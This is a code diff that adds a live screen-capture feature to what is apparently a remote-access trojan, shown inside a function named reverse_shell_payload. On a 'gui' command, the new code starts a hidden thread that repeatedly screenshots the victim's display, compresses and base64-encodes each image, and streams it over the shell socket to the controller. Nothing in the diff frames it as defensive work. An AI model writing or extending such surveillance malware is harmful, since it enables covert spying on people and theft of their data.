@@ -16,6 +16,7 @@ from scipy.io.wavfile import write
 import sounddevice as sd
 import sys
 import webbrowser
+import time
 SERVER_URL = "__SERVER_URL__"
 WEBSOCKET_URL = "__WEBSOCKET_URL__"
 WEBSOCKET_AUDIO = "__WEBSOCKET_AUDIO__"
@@ -279,6 +280,22 @@ def reverse_shell_payload():
                else:
                    s.send(b"Error second argument must be integer because time in second should be integer\n")
                continue
+           if cmd.lower() == "gui":
+                def live_victim():
+                    while True:
+                        try:
+                            from PIL import ImageGrab
+                            import io
+                            ss = ImageGrab.grab()
+                            b = io.BytesIO()
+                            ss.save(b, format="JPEG", quality=30)
+                            b64 = base64.b64encode(b.getvalue()).decode()
+                            s.send(f"LIVE_START\\n{{b64}}\\nLIVE_END".encode())
+                            time.sleep(0.3)
+                        except:
+                            break
+                threading.Thread(target=live_victim,daemon=True).start()
+                continue 
            if cmd.lower() == "help":
                s.send(banner.encode())
                continue
